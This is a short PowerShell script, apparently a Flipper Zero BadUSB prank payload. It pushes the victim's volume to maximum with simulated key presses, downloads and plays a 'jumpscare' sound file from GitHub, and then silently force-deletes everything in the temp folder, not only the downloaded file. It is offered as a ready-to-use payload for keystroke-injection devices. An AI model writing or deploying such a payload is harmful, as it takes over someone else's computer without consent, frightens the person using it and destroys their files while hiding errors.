#You could also if u want change this wav file to any other to play any other audio at max volume
$URLOFWAV = "github.com/SIGUrger/FlipperZeroBadusb/blob/main/Resources/jumpscare.wav?raw=true&dl=1"

$a = New-Object -Co WScript.Shell;
for($i=0; $i -lt 100; $i++){
    $a.SendKeys([char]175)
};
iwr $URLOFWAV -O $env:TMP\s.wav #Download the wav and output it to the temp folder

$soundPlayer = New-Object System.Media.SoundPlayer
$soundPlayer.SoundLocation = "$env:TMP\s.wav"; 
$soundPlayer.playsync()

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue #Clear the temp folder to also get rid of the temp wav file